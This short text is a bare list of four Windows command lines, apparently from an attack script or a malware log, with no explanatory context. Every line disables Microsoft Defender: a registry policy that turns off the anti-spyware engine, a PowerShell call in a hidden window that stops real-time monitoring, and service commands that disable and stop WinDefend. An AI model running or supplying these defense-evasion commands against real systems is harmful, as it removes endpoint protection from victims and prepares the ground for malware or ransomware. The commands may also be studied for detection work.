REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
cmd.exe /C C:\Windows\system32\cmd.exe /c start /min powershell.exe -nop -w hidden -noni -c command "Set-MpPreference -DisableRealtimeMonitoring $true"
cmd.exe /C C:\Windows\system32\cmd.exe /c start /min sc config WinDefend start= disabled
cmd.exe /C C:\Windows\system32\cmd.exe /c start /min sc stop WinDefend
